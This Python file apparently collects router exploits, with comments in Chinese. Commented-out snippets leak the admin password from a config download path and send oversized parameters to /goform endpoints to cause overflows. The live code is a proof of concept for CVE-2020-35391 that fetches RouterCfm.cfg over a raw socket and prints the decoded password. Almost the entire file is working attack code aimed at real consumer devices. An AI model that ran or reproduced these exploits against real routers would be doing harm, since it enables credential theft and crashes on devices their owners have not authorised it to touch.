import requests
import re
import base64

# url = "http://192.168.0.1"
# payload = "/cgi-bin/DownloadCfg/RouterCfm.cfg"

# r1 = requests.get(url)
# print("目标",url,"响应:",r1.status_code)
# print(">" * 50)
# r2 = requests.get(url+payload)
# if 'sys.userpass' in r2.text:
#     print(url,"存在密码泄露")
#     text=r2.text
#     obj = re.compile(r"sys.userpass=(?P<pass>.*)")
#     base = obj.search(text).group("pass")
#     print("密码：",base64.b64decode(base))
# else:
#     print("不存在密码泄漏")
# ----------------------------------------------------------


# import requests

# url = 'http://192.168.0.1/goform/addWifiMacFilter'

# headers = {"Cookie": "password=inputyourcookie"}
# data = {
#     'deviceMac': 'a' * 10000
# }

# r = requests.post(url=url, headers=headers, data=data)
# print(r.text)

# ----------------------------------------------------------

# import requests

# IP = "192.168.0.1" # 路由器ip
# url = f"http://{IP}/goform/addressNat?"
# url += "entrys=" + "s" * 0x200
# url += "&mitInterface=" + "a" * 0x200

# response = requests.get(url)

# ----------------------------------------------------------
# import requests

# IP = "192.168.2.199"
# url = f"http://{IP}/goform/fast_setting_wifi_set?"
# url += "ssid=" + "s" * 100

# response = requests.get(url)

# ----------------------------------------------------------

''' CVE-2020-35391-POC '''

import base64
import socket
import sys


def get_ip_from_command_line():
    '''Get Router IP from command line'''
    if len(sys.argv) > 1:
        return sys.argv[1]
    print("Usage: python3 main.py <ip>")
    sys.exit()


def send_request(router_ip: str):
    '''Send request to router'''
    port = 80
    url = b"/cgi-bin/DownloadCfg/RouterCfm.cfg HTTP/1.1"

    socker_handler = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    socker_handler.connect((router_ip, port))
    socker_handler.send(b"GET " + url + b" HTTP/1.0\n\n")

    full_response = b""

    while True:
        server_response = socker_handler.recv(1024)
        if not server_response:
            break
        full_response += server_response

    return full_response


def get_password_from_response(server_response):
    '''Get password from response'''
    http_passwd_str = server_response.split(b"http_passwd=")[1]
    decoded_password = base64.b64decode(http_passwd_str)
    return decoded_password.decode("utf-8")


ROUTER_IP = get_ip_from_command_line()
SERVER_RESPONSE = send_request(ROUTER_IP)
DECODED_PASSWORD = get_password_from_response(SERVER_RESPONSE)

print("Password - " + DECODED_PASSWORD)